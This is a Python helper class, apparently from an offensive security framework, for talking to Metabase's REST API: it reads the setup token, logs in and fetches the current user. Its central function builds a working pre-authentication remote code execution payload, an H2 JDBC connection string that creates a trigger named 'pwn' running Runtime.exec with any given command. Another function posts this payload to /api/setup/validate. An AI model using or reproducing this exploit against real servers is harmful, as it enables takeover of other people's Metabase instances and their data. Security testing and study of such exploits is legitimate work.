#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Generic Metabase HTTP / REST helpers."""

from __future__ import annotations

import json
from typing import Any, Dict, Optional

from core.framework.base_module import BaseModule


class Metabase(BaseModule):
    """Shared Metabase API calls (session, setup, H2 JDBC validate)."""

    def metabase_api_path(self, suffix: str) -> str:
        base = (getattr(self, "path", None) or "/").strip()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        if not base or base == "/":
            return suffix
        return f"/{base.strip('/')}{suffix}"

    def metabase_session_properties(self) -> Dict[str, Any]:
        response = self.http_request(
            method="GET", path=self.metabase_api_path("/api/session/properties")
        )
        if not response or int(response.status_code or 0) >= 400:
            return {}
        try:
            payload = response.json()
        except Exception:
            return {}
        return payload if isinstance(payload, dict) else {}

    def metabase_setup_token(self) -> str:
        return str(self.metabase_session_properties().get("setup-token") or "").strip()

    def metabase_version_tag(self) -> str:
        props = self.metabase_session_properties()
        return str((props.get("version") or {}).get("tag") or "").strip()

    @staticmethod
    def metabase_h2_jdbc_validate_body(setup_token: str, command: str) -> dict:
        safe_cmd = str(command).replace("'", "\\'")
        jdbc = (
            "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;"
            "TRACE_LEVEL_SYSTEM_OUT=1\\;"
            "CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS "
            "$$//javascript\njava.lang.Runtime.getRuntime().exec('%s')\n$$--=x"
            % safe_cmd
        )
        return {
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {"db": jdbc, "advanced-options": False, "ssl": True},
                "name": "x",
                "engine": "h2",
            },
        }

    def metabase_post_setup_validate(self, setup_token: str, command: str) -> str:
        body = self.metabase_h2_jdbc_validate_body(setup_token, command)
        response = self.http_request(
            method="POST",
            path=self.metabase_api_path("/api/setup/validate"),
            data=json.dumps(body),
            headers={"Content-Type": "application/json"},
        )
        return (response.text or "")[:2000] if response else ""

    def metabase_login(self, username: str, password: str) -> str:
        response = self.http_request(
            method="POST",
            path=self.metabase_api_path("/api/session"),
            data=json.dumps({"username": username, "password": password}),
            headers={"Content-Type": "application/json"},
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        try:
            payload = response.json()
        except Exception:
            return ""
        sid = payload.get("id") if isinstance(payload, dict) else None
        if not sid:
            return ""
        text = str(sid)
        if getattr(self, "session", None) is not None:
            self.session.headers["X-Metabase-Session"] = text
        return text

    def metabase_current_user(self, session_id: str) -> Optional[Dict[str, Any]]:
        response = self.http_request(
            method="GET",
            path=self.metabase_api_path("/api/user/current"),
            headers={"X-Metabase-Session": session_id},
        )
        if not response or int(response.status_code or 0) != 200:
            return None
        try:
            data = response.json()
        except Exception:
            return None
        return data if isinstance(data, dict) else None